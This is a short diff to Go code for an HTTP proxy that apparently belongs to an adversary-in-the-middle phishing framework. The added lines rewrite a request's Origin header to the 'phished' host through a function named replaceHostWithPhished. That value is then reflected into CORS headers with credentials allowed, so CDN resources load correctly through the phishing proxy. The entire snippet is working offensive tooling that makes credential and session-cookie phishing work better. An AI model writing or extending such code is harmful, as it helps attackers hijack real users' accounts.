@@ -917,6 +917,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// Add CORS headers if missing - needed for gstatic.com and other CDNs
 				origin := resp.Request.Header.Get("Origin")
 				if origin != "" {
+					if u, err := url.Parse(origin); err == nil {
+						if p_host, ok := p.replaceHostWithPhished(u.Host); ok {
+							origin = u.Scheme + "://" + p_host
+						}
+					}
 					resp.Header.Set("Access-Control-Allow-Origin", origin)
 					resp.Header.Set("Access-Control-Allow-Credentials", "true")
 					resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
